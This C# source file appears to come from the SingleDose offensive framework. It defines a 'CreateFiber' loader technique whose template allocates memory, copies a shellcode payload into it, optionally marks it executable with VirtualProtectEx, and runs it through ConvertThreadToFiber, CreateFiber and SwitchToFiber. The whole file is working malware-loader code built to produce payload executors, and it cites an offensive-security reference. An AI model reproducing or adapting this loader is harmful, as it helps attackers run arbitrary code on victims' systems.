using System.Collections.Generic;

namespace SingleDose.Techniques.Loaders
{
    internal class CreateFiber : ITechnique
    {
        string ITechnique.TechniqueName => "CreateFiber";

        string ITechnique.TechniqueDescription => null;

        List<string> ITechnique.TechniqueReferences => new List<string>() {
            @"https://www.ired.team/offensive-security/code-injection-process-injection/executing-shellcode-with-createfiber"
        };

        bool ITechnique.IsUnsafe => false;

        bool ITechnique.IsLoader => true;
        
        List<string> ITechnique.Invokes => new List<string>() { "VirtualAlloc","ConvertThreadToFiber", "CreateFiber", "SwitchToFiber" };
        
        List<string> ITechnique.Prerequisites => null;
        
        string ITechnique.Base => @"
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Linq;

namespace {{NAMESPACE}}
{
    class Program
    {
        public static void Main(string[] args)
        {
            {{MODE}}
            {{TRIGGER}}
            IntPtr newFiber = ConvertThreadToFiber(IntPtr.Zero);
            IntPtr hAlloc = VirtualAlloc(IntPtr.Zero, (uint)payload.Length, 0x1000 | 0x2000, {{flProtect}});
            Marshal.Copy(payload, 0, hAlloc, payload.Length);
            {{PROTECT}}
            IntPtr shellcodeFiber = CreateFiber(0, hAlloc, IntPtr.Zero);
            SwitchToFiber(shellcodeFiber);
        }
        {{ARGS}}
        {{INVOKE}}
    }
}";

        string ITechnique.VProtect => @"uint oldProtect;
            VirtualProtectEx(Process.GetCurrentProcess().Handle, hAlloc, payload.Length, 0x20, out oldProtect);";
    }
}
